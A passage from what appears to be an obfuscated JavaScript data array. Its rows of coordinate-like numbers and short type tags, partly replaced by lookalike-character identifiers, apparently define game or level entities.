			[1, ⵠ[568], ⲆᐃᐃⲆ, 46, 8, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 45, 8, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 45, 7, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 45, 6, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 46, ΔᐃⲆᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 44, 6, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 44, 8, 1],
			[1, ⵠ[568], 2, 43, ⲆⲆᐃⵠΔ, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 43, ⵠΔᐃⵠⵠ, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 43, ⲆᐃⲆᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 42, ΔᐃⲆᐃ, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 42, 7, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[568], 2, 42, 8, 1],
			[ⵠΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 41, 7, ΔⲆⵠ],
			[1, ⵠ[568], 2, 41, ⵠΔᐃΔⲆ, 1],
			[1, ⵠ[568], 2, 40, ⲆΔᐃΔⵠ, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 40, 7, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 40, 8, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 39, 8, 1],
			[1, ⵠ[568], 0, 39, 7, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⲆᐃ, 38, ΔᐃΔⲆⲆ, 1],
			[1, ⵠ[568], 2, 39, 6, ΔΔΔ],
			[1, ⵠ[568], 2, 38, 6, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 37, ⵠΔᐃΔⲆ, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 38, ᐃΔⲆΔᐃ, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[568], 2, 37, ⵠⵠⲆⲆⵠ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 37, ⵠⵠⲆⵠΔ, 1],
			[1, ⵠ[568], 2, 37, ⲆⵠΔΔᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 38, ᐃΔᐃΔⲆ, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 0, 38, ⵠⲆⲆᐃⲆⵠⵠ, 1],
			[ΔΔΔ, ⵠ[568], Δⵠᐃ, 38, ⲆΔⲆᐃΔΔⲆ, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], 1, 37, 18, 1],
			[Ⲇᐃⵠ, ⵠ[568], 0, 38, 19, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 37, ΔⵠⲆⵠᐃᐃΔ, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 37, ΔᐃᐃΔⵠ, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 37, 17, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 38, 18, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 37, 19, 1],
			[ⵠⲆΔ, ⵠ[568], ⲆΔⵠⵠ, 38, ⲆⲆⲆΔΔ, 1],
			[1, ⵠ[568], 0, 37, 21, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ΔΔⵠ, 38, 22, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 0, 38, 24, 1],
			[1, ⵠ[568], 2, 37, 20, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 38, ΔΔⲆⵠᐃ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 38, 21, 1],
			[1, ⵠ[568], 1, 37, 23, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⲆᐃⲆ, 37, 22, Ⲇᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], ⲆΔⵠⵠ, 38, 23, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 37, 24, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 0, 38, 30, ΔⲆⵠ],
			[ΔⲆⵠ, ⵠ[568], ᐃΔΔ, 38, 32, ΔⲆⵠ],
			[1, ⵠ[568], ΔΔⵠ, 37, 31, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆᐃ, 38, 34, 1],
			[1, ⵠ[568], 1, 37, 29, 1],
			[1, ⵠ[568], 2, 38, 29, ⵠΔᐃ],
			[1, ⵠ[568], 2, 37, 30, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 38, 31, ⵠⲆΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 37, 32, 1],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠⵠᐃ, 38, 33, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⵠ, 38, 35, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 37, 33, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 36, ΔᐃΔⲆⲆ, ⵠΔⲆ],
			[1, ⵠ[568], 0, 36, 11, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⲆⲆ, 35, 9, 1],
			[1, ⵠ[568], 2, 36, 9, 1],
			[1, ⵠ[568], 2, 36, 10, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], ⲆᐃᐃⲆ, 35, 10, 1],
			[ⵠΔΔ, ⵠ[568], ⵠΔᐃ, 33, 8, ᐃᐃⵠ],
			[1, ⵠ[568], 3, 34, 9, 1],
			[ⵠΔΔ, ⵠ[568], 3, 35, ΔᐃΔⲆⲆ, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 2, 34, ΔᐃᐃⲆᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 0, 36, ᐃΔⲆΔᐃ, ⵠΔᐃ],
			[1, ⵠ[568], ᐃᐃⵠ, 34, 7, 1],
			[1, ⵠ[568], 2, 35, ᐃⲆⲆᐃᐃ, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 35, ⲆΔᐃΔⵠ, ΔΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 36, 6, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 68, 9, 1],
			[1, ⵠ[568], 2, 66, ᐃΔᐃΔⲆ, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 3, 66, 9, ⵠΔΔ],
			[1, ⵠ[568], 0, 67, 9, 1],
			[1, ⵠ[568], 0, 66, 8, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 67, ⵠⵠⲆⵠΔ, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ΔⲆⵠ, 68, ᐃⵠⲆᐃᐃ, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], ⵠΔⲆ, 66, ⲆΔᐃⵠᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠΔⲆ, 67, ⵠⲆⲆᐃⵠ, 1],
			[ⵠΔΔ, ⵠ[568], ᐃΔΔ, 66, 6, 1],
			[ⵠΔΔ, ⵠ[568], 2, 66, ⵠΔᐃⵠⵠ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 67, ᐃΔⲆΔᐃ, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 69, 8, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 63, 32, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 2, 62, 34, ⵠⲆΔ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 60, 35, 1],
			[1, ⵠ[568], 3, 59, 35, 1],
			[ⵠΔΔ, ⵠ[568], 0, 61, 35, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], 0, 63, 34, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 63, 33, ⵠⲆΔ],
			[1, ⵠ[568], 2, 63, 35, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 62, 35, ⵠΔΔ],
			[1, ⵠ[568], 2, 58, 36, 1],
			[1, ⵠ[568], ⵠⲆΔ, 59, 36, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], 1, 62, 36, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 60, 36, ΔⲆⵠ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 61, 34, 1],
			[1, ⵠ[568], 3, 62, 33, 1],
			[Ⲇᐃⵠ, ⵠ[568], 3, 63, 36, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠⵠᐃ, 61, 36, ⵠΔⲆ],
			[1, ⵠ[568], 0, 42, 36, 1],
			[ⵠΔΔ, ⵠ[568], ⵠΔⲆ, 39, 36, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 41, 36, 1],
			[1, ⵠ[568], 3, 39, 35, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 40, 36, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⲆᐃᐃ, 43, 36, Ⲇᐃⵠ],
			[1, ⵠ[568], 1, 40, 35, ⵠΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 41, 35, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 40, 34, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 39, 34, 1],
			[ΔΔΔ, ⵠ[568], ΔⵠᐃⲆ, 39, 33, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 39, 32, ΔⲆⵠ],
			[1, ⵠ[568], 0, 40, 33, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 41, 34, ΔΔΔ],
			[1, ⵠ[568], 1, 44, 36, 1],
			[1, ⵠ[568], ΔⲆᐃⲆ, 43, 35, ⵠΔⲆ],
			[1, ⵠ[568], 2, 42, 35, 1],
			[Ⲇᐃⵠ, ⵠ[568], ΔⲆⲆ, 37, 34, 1],
			[ΔΔΔ, ⵠ[568], ᐃᐃⲆⲆ, 59, 30, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], Δⵠᐃ, 60, 29, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[568], 2, 60, 28, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 60, 27, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 60, 26, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 54, 25, 1],
			[Ⲇᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 48, 25, 1],
			[1, ⵠ[568], 2, 42, 26, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆΔⵠ, 55, 25, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 59, 26, 1],
			[ⵠΔⲆ, ⵠ[568], 0, 43, 26, 1],
			[Ⲇᐃⵠ, ⵠ[568], 1, 42, 27, 1],
			[1, ⵠ[568], 2, 42, 28, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 43, 30, 1],
			[1, ⵠ[568], ΔⲆⲆ, 42, 29, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 54, 24, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ΔΔⵠ, 48, 24, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 54, 23, 1],
			[ⵠΔΔ, ⵠ[568], 2, 48, 23, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 63, 22, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 63, 21, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 39, 21, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 57, 18, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 56, ᐃⵠⲆΔΔ, 1],
			[1, ⵠ[568], ⲆΔⵠⵠ, 51, 21, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⲆⲆ, 51, ⵠᐃΔᐃᐃ, ΔⲆⵠ],
			[1, ⵠ[568], 2, 51, 19, 1],
			[ⵠΔΔ, ⵠ[568], 3, 51, 18, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 63, 16, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 63, ⵠⲆⲆᐃⵠ, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠⵠΔ, 56, 13, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 57, 13, 1],
			[1, ⵠ[568], ⵠΔΔ, 45, 18, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠΔⲆ, 47, 18, ΔΔΔ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 46, 18, 1],
			[Ⲇᐃⵠ, ⵠ[568], 0, 46, 13, 1],
			[1, ⵠ[568], 2, 45, ΔⲆⵠΔⵠ, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠΔⲆ, 39, ⵠⵠΔⲆᐃ, 1],
			[1, ⵠ[568], 2, 39, ΔⵠΔᐃᐃ, 1],
			[ⵠΔᐃ, ⵠ[568], ΔⵠᐃⲆ, 47, 17, 1],
			[ⵠⲆΔ, "a", 0, 51, 15, ᐃᐃⵠ],
			[1, "a", ᐃⲆᐃ, 53, 14, ⵠΔⲆ],
			[1, "a", 1, 49, ⵠᐃⵠΔᐃ, ᐃⲆᐃ],
			[1, ⵠ[348], 8, 55, 15, 0],
			[1, ⵠ[348], ⵠⲆΔⵠⵠ, 48, 28, 0],
			[ⵠΔᐃ, ⵠ[348], 10, 58, 26, ᐃⵠⲆ],
			[1, ⵠ[348], ΔⵠᐃΔⵠ, 59, 29, ΔΔⵠ],
			[1, ⵠ[348], 11, 55, 34, ᐃⵠΔ],
			[1, ⵠ[348], 10, 48, 33, 0],
			[1, ⵠ[348], 9, 41, 32, 0],
			[1, ⵠ[348], 9, 56, 24, 0],
			[ⵠΔΔ, ⵠ[348], ΔⲆⵠΔⲆ, 62, ΔΔᐃᐃΔ, ᐃⵠⲆ],
			[ⵠΔΔ, ⵠ[348], 9, 45, 11, ΔⲆⲆ],
			[1, ⵠ[348], 9, 44, ⵠᐃᐃΔᐃ, 0],
			[ⵠⲆΔ, ⵠ[348], ⲆΔΔᐃᐃ, 44, Δⵠᐃⵠⵠ, 0],
			[ᐃⲆᐃ, ⵠ[348], ⲆΔΔᐃᐃ, 58, 13, 0],
			[ΔΔΔ, ⵠ[348], 10, 63, 31, 0],
			[1, ⵠ[348], 8, 60, 30, ⵠⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], ⵠⵠⲆⵠΔ, 43, 26, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 10, 43, 29, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 10, 53, 29, ᐃⵠΔ],
			[1, ⵠ[348], 10, 53, 24, ᐃΔΔ],
			[1, ⵠ[348], ⵠⲆⲆΔᐃ, 53, 19, 0],
			[1, ⵠ[348], ⲆⲆᐃΔⲆⲆⲆ, 49, ΔⲆⲆⲆⵠ, ⵠⲆⲆ],
			[1, ⵠ[348], ⵠⵠⲆΔΔ, 39, 26, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], ΔⵠᐃᐃⲆ, 46, 24, 0],
			[1, ⵠ[348], 9, 62, 10, 0],
			[ΔⲆⵠ, ⵠ[348], ᐃⵠⲆᐃᐃ, 40, 14, 0],
			[1, ⵠ[348], 32, 55, 35, ᐃⵠΔ],
			[1, ⵠ[348], 32, 60, 33, Δⵠᐃ],
			[1, ⵠ[348], 32, 63, 28, 0],
			[1, ⵠ[348], 32, 63, 24, 0],
			[1, ⵠ[348], 32, 58, 22, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 32, 59, ⲆᐃᐃⲆΔ, 0],
			[ᐃᐃⵠ, ⵠ[348], 32, 63, ⲆⵠΔᐃⵠ, 0],
			[ⵠΔᐃ, ⵠ[348], 32, 59, ⵠⵠΔⲆᐃ, 0],
			[1, ⵠ[348], 32, 56, ⵠⲆⵠⲆⵠ, ᐃⵠΔ],
			[1, ⵠ[348], 32, 52, 17, ΔΔⵠ],
			[1, ⵠ[348], 32, 51, 14, 0],
			[Ⲇᐃⵠ, ⵠ[348], 32, 39, 12, 0],
			[ⵠⲆΔ, ⵠ[348], 32, 39, ⲆᐃΔⵠΔ, 0],
			[ⵠΔΔ, ⵠ[348], 32, 41, 25, ᐃⵠⲆ],
			[ⵠΔᐃ, ⵠ[348], 32, 39, 30, Δⵠᐃ],
			[1, ⵠ[348], 32, 50, 29, ᐃΔΔ],
			[1, ⵠ[348], 32, 43, 34, 0],
			[1, ⵠ[348], 32, 47, 34, ⲆΔⵠ],
			[1, ⵠ[348], 31, 54, 33, 0],
			[ⵠⲆΔ, ⵠ[348], 31, 59, 24, 0],
			[1, ⵠ[348], 31, 63, ΔⲆⲆⲆⵠ, 0],
			[1, ⵠ[348], 31, 47, 15, ⵠⲆⲆ],
			[1, ⵠ[348], 31, 43, 17, ΔⲆⲆ],
			[1, ⵠ[348], 31, 39, 27, 0],
			[ᐃⲆᐃ, ⵠ[348], 31, 48, 27, 0],
			[ⵠⲆΔ, ⵠ[348], 31, 57, 27, ΔⲆⲆ],
			[1, ⵠ[348], 32, 44, 27, 0],
			[ⵠΔⲆ, "d", 0, ΔᐃΔⵠⵠ, ⲆⵠΔᐃⵠ, 1],
			[Ⲇᐃⵠ, "d", 0, 89, Δⵠᐃⵠⵠ, ⵠΔᐃ],
			[1, "d", 1, 91, 21, 1],
			[1, "d", ⵠⲆΔ, ⵠⲆⲆᐃⵠ, 22, ⵠΔⲆ],
			[ⵠⲆΔ, "f", 2, 89, 18, 1],
			[1, "f", 0, 88, 19, ΔⲆⵠ],
			[1, "g", ΔⲆⵠ, 85, 22, 1],
			[ⵠΔⲆ, "s", 1, 90, 29, 1],
			[1, "s", ⵠⲆΔ, 92, 15, 1],
			[ᐃⲆᐃ, "s", ᐃⵠΔ, 91, 31, ⵠΔⲆ],
			[1, "s", 2, 90, 38, 1],
			[1, "s", 0, 91, 42, 1],
			[1, "s", ᐃⵠΔ, 90, 49, ᐃᐃⵠ],
			[Ⲇᐃⵠ, "f", 1, 86, 43, Ⲇᐃⵠ],
			[1, "f", 0, 81, 45, 1],
			[ΔΔΔ, "f", 2, 66, 44, ⵠΔⲆ],
			[1, "f", ᐃⲆΔⲆ, 55, 49, ᐃⲆᐃ],
			[ᐃⲆᐃ, "f", 1, 54, 50, 1],
			[ⵠⲆΔ, "f", ᐃⲆΔⲆ, 43, 45, ᐃⲆᐃ],
			[1, "f", 2, 31, 48, ⵠΔΔ],
			[ⵠΔΔ, "f", ⵠΔⲆ, 27, 39, 1],
			[1, "f", 1, 80, 46, ᐃᐃⵠ],
			[ΔⲆⵠ, "f", ⵠΔΔ, 69, 48, 1],
			[1, "g", 0, 80, 40, ⵠΔᐃ],
			[1, "g", 2, 81, 40, ΔⲆⵠ],
			[1, "s", ⵠⵠⵠΔ, 77, 39, ⵠΔᐃ],
			[ΔΔΔ, "s", 0, 68, 43, ⵠΔⲆ],
			[1, "s", ⵠⵠΔⲆ, 57, 41, 1],
			[1, "s", 1, 56, 42, ᐃᐃⵠ],
			[1, "s", 1, 40, 41, Ⲇᐃⵠ],
			[1, "s", 2, 48, 48, 1],
			[ⵠⲆΔ, "f", ⲆⲆΔᐃ, ⲆᐃᐃⲆΔ, ΔᐃΔⵠⵠ, ⵠΔᐃ],
			[ΔⲆⵠ, "f", 0, 13, 31, 1],
			[1, "f", 1, ⵠⵠⵠᐃᐃ, 32, 1],
			[ⵠΔⲆ, "s", 0, 15, 27, Ⲇᐃⵠ],
			[1, "s", 0, ⲆⵠΔᐃⵠ, 39, 1],
			[ᐃᐃⵠ, "f", ᐃⲆⵠᐃ, ⵠⲆⲆᐃⲆⵠⵠ, ⲆⲆⲆⵠⲆ, 1],
			[ⵠΔⲆ, "f", ᐃᐃⵠ, 12, ⲆⵠΔⵠⵠ, ⵠΔΔ],
			[1, "g", ⲆⲆΔᐃ, ΔΔΔᐃᐃⲆᐃ, 25, ΔΔΔ],
			[1, "f", ΔⲆⲆ, 16, 45, 1],
			[1, "f", 1, ⵠⲆᐃⵠⵠΔⵠ, 46, 1],
			[ⵠΔᐃ, "s", ⵠΔΔ, 74, 48, ⵠΔᐃ],
			[ΔΔΔ, "s", ᐃᐃⵠ, ΔΔⲆⵠᐃ, 47, 1],
			[ⵠΔⲆ, "g", Δⵠᐃ, 58, 59, 1],
			[ⵠΔΔ, "g", ΔⲆⲆ, 46, 72, ⵠⲆΔ],
			[1, "g", ΔΔⵠ, 69, 79, 1],
			[1, "g", ΔⲆⲆ, 72, 74, 1],
			[ⵠΔᐃ, "g", ⵠⲆⲆ, 26, 88, ΔΔΔ],
			[ⵠΔΔ, "g", ΔⲆⲆ, 20, 74, ᐃᐃⵠ],
			[1, "g", ΔΔⵠ, 28, 67, ΔΔΔ],
			[1, "g", 0, 49, 86, ᐃⲆᐃ],
			[1, "g", ᐃⵠⲆ, 77, 90, ⵠⲆΔ],
			[1, "g", 0, 87, 72, ⵠΔⲆ],
			[1, "g", ᐃⵠΔ, ⲆΔⲆⵠᐃ, 85, 1],
			[Ⲇᐃⵠ, "g", 1, 85, 97, 1],
			[ᐃᐃⵠ, "g", 1, 68, 104, 1],
			[1, "g", ΔⲆⵠ, 63, 91, 1],
			[1, "g", ⵠⲆΔ, 39, 90, 1],
			[1, "g", ⵠⲆΔ, 34, 99, ΔⲆⵠ],
			[ΔⲆⵠ, "g", 1, ⵠᐃⵠⲆⲆ, 103, 1],
			[1, "g", 2, 77, 60, ᐃⲆᐃ],
			[ⵠΔⲆ, "g", 2, 19, 56, 1],
			[1, "g", 2, 39, 60, ⵠΔⲆ],
			[ⵠⲆΔ, "g", ᐃⲆⵠᐃ, 87, 57, ΔΔΔ],
			[1, "f", 0, ⲆΔⲆΔⵠ, 62, Ⲇᐃⵠ],
			[1, "f", 0, ⵠⲆⲆⲆᐃ, 81, ᐃⲆᐃ],
			[ᐃᐃⵠ, "f", 0, 26, 59, 1],
			[1, "f", ⵠⲆⲆ, 35, 53, ⵠΔⲆ],
			[1, "f", 0, 44, 58, Ⲇᐃⵠ],
			[ⵠΔᐃ, "f", ΔΔⵠ, 88, 62, 1],
			[1, "f", 0, 91, 82, 1],
			[ⵠΔⲆ, "f", 0, 84, 85, Ⲇᐃⵠ],
			[ᐃᐃⵠ, "f", 0, 79, 69, ᐃᐃⵠ],
			[1, "f", 0, 64, 71, 1],
			[ⵠⲆΔ, "f", 0, 62, 83, 1],
			[1, "f", ΔΔⵠ, 34, 81, 1],
			[1, "f", 0, 39, 71, 1],
			[1, "f", 0, 54, 94, ΔⲆⵠ],
			[1, "f", 1, 81, 70, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", 1, 91, 72, 1],
			[ΔΔΔ, "f", ΔΔΔ, ⵠⵠⲆⵠΔ, 91, ᐃᐃⵠ],
			[1, "f", ⵠΔᐃ, ⵠⲆΔᐃᐃ, 81, 1],
			[1, "f", 1, 29, 79, 1],
			[Ⲇᐃⵠ, "f", ⵠΔΔ, 13, 65, Ⲇᐃⵠ],
			[1, "f", 1, 46, 97, 1],
			[ᐃᐃⵠ, "f", 1, 43, 73, 1],
			[ⵠΔᐃ, "f", 1, 60, 69, 1],
			[ᐃⲆᐃ, "f", ΔⲆⵠ, 70, 96, 1],
			[1, "f", 1, 58, 84, 1],
			[ΔΔΔ, "s", 1, 56, 76, 1],
			[1, "s", Ⲇᐃⵠ, 85, 74, 1],
			[1, "s", 0, 72, 71, ᐃᐃⵠ],
			[ΔⲆⵠ, "s", 0, 41, 62, ⵠΔⲆ],
			[ⵠⲆΔ, "s", ᐃⵠΔ, 60, 61, 1],
			[1, "s", 0, 20, 66, 1],
			[1, "s", 0, 47, 83, ⵠⲆΔ],
			[1, "s", ⲆΔⵠ, 29, 86, ⵠΔΔ],
			[1, "s", ᐃⵠⲆ, 78, 92, 1],
			[ΔⲆⵠ, "s", 0, 62, 102, ⵠΔⲆ],
			[ⵠΔⲆ, "s", 0, ⲆⵠΔⵠⵠ, 95, ᐃᐃⵠ],
			[1, "s", 2, 64, 101, ⵠΔⲆ],
			[ⵠΔᐃ, "s", 2, 78, 84, ⵠΔᐃ],
			[1, "s", 2, 49, 83, ᐃᐃⵠ],
			[1, "s", ᐃⲆⵠᐃ, ⲆᐃⲆΔⲆ, 76, 1],
			[Ⲇᐃⵠ, "s", ⲆᐃᐃⲆ, 21, 84, 1],
			[1, "f", ᐃᐃⵠ, 26, 94, ⵠΔᐃ],
			[1, "f", 2, 23, 96, 1],
			[1, "f", ⲆᐃᐃⲆ, 25, 72, ⵠⲆΔ],
			[ⵠΔⲆ, "f", ΔⵠᐃⲆ, 85, 77, 1],
			[ⵠⲆΔ, "f", ⲆᐃᐃⲆ, 79, 95, 1],
			[ⵠΔᐃ, "f", ⲆᐃᐃⲆ, 51, 65, 1],
			[1, "f", ΔⵠᐃⲆ, 69, 60, 1],
			[ⵠΔΔ, "f", ⵠⲆΔ, 25, 105, Ⲇᐃⵠ],
			[ⵠΔΔ, "s", 1, ⲆⵠⵠⲆⲆ, 68, ΔⲆⵠ],
			[1, "s", 0, 55, 76, ⵠⲆΔ],
			[1, "s", ΔΔⵠ, 74, 59, 1],
			[ⵠΔᐃ, "f", 1, 46, 142, 1],
			[1, "f", 1, ⵠⲆᐃΔᐃ, 140, ᐃⲆᐃ],
			[1, "f", ⵠΔΔ, 77, 137, ᐃᐃⵠ],
			[1, "f", 0, 75, 137, ΔΔΔ],
			[Ⲇᐃⵠ, "f", 0, 55, 138, 1],
			[1, "f", 0, 33, 127, ᐃⲆᐃ],
			[ᐃᐃⵠ, "f", 0, 76, 121, ΔⲆⵠ],
			[ⵠⲆΔ, "f", 0, 55, 121, 1],
			[ⵠΔΔ, "f", ΔⲆⲆ, 13, 123, 1],
			[1, "f", 0, ⲆⵠⵠⲆⲆ, 141, ⵠΔⲆ],
			[1, "f", 0, 40, 137, ΔⲆⵠ],
			[ᐃᐃⵠ, "f", 2, 76, 142, 1],
			[Ⲇᐃⵠ, "f", 2, 57, 140, 1],
			[ᐃⲆᐃ, "f", ⲆᐃᐃⲆ, 39, 138, 1],
			[1, "f", 2, ΔΔᐃᐃΔ, 143, ⵠΔⲆ],
			[1, "f", 2, 29, 131, ⵠΔΔ],
			[ᐃᐃⵠ, "f", 0, 70, 150, ᐃⲆᐃ],
			[1, "f", 0, 28, 146, ᐃⲆᐃ],
			[Ⲇᐃⵠ, "f", 0, ⲆΔⵠᐃⲆ, 132, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", ⵠⲆⲆ, 90, 129, 1],
			[1, "f", 1, 87, 131, 1],
			[1, "f", 0, 91, 143, ⵠΔᐃ],
			[1, "f", 2, 87, 145, 1],
			[ᐃᐃⵠ, "f", 1, 89, 141, 1],
			[ⵠΔΔ, "f", 1, 63, 130, ΔΔΔ],
			[ⵠΔⲆ, "f", 1, 75, 122, 1],
			[ᐃᐃⵠ, "f", 1, 52, 124, 1],
			[ᐃᐃⵠ, "f", ⵠΔᐃ, 34, 127, ΔⲆⵠ],
			[ᐃⲆᐃ, "f", 1, ⵠⲆΔᐃᐃ, 123, ⵠΔⲆ],
			[1, "f", 1, 24, 122, Ⲇᐃⵠ],
			[1, "f", ᐃⵠΔ, 83, 108, 1],
			[ΔⲆⵠ, "f", ᐃⵠΔ, 89, 118, 1],
			[ᐃⲆᐃ, "f", 0, 56, 107, Ⲇᐃⵠ],
			[1, "f", 0, 38, 113, ΔΔΔ],
			[ⵠⲆΔ, "f", ᐃⵠⲆ, 16, 110, ⵠΔΔ],
			[ⵠΔΔ, "f", ⵠΔᐃ, 80, 105, ⵠΔΔ],
			[1, "f", ⵠⲆΔ, 82, 109, 1],
			[ⵠⲆΔ, "f", 1, 87, 118, ⵠΔⲆ],
			[ⵠⲆΔ, "f", 1, 59, 110, ᐃᐃⵠ],
			[1, "f", ᐃᐃⵠ, 29, 111, 1],
			[1, "f", 2, 28, 112, 1],
			[1, "f", 2, 70, 112, ⵠΔⲆ],
			[Ⲇᐃⵠ, "f", 2, 42, 111, 1],
			[ⵠΔⲆ, "s", 0, 68, 157, 1],
			[1, "s", ΔΔⵠ, 81, 158, 1],
			[1, "s", ᐃⵠⲆ, 25, 172, 1],
			[1, "s", 0, 22, 161, ΔΔΔ],
			[1, "s", 0, 35, 152, 1],
			[1, "s", 0, 66, 144, ΔⲆⵠ],
			[ⵠΔᐃ, "s", ΔΔⵠ, 87, 145, 1],
			[ⵠⲆΔ, "s", 0, 86, 145, ⵠΔᐃ],
			[ᐃⲆᐃ, "s", ΔΔⵠ, 84, 135, ⵠΔⲆ],
			[ⵠΔᐃ, "s", ⲆΔⵠ, 69, 133, 1],
			[ⵠΔᐃ, "s", 0, 84, 122, ΔΔΔ],
			[ΔⲆⵠ, "s", 0, 68, 121, ᐃᐃⵠ],
			[1, "s", 0, 48, 124, 1],
			[1, "s", 0, 26, 129, 1],
			[ΔΔΔ, "s", 0, ⲆⵠⲆⲆⲆ, 127, ᐃⲆᐃ],
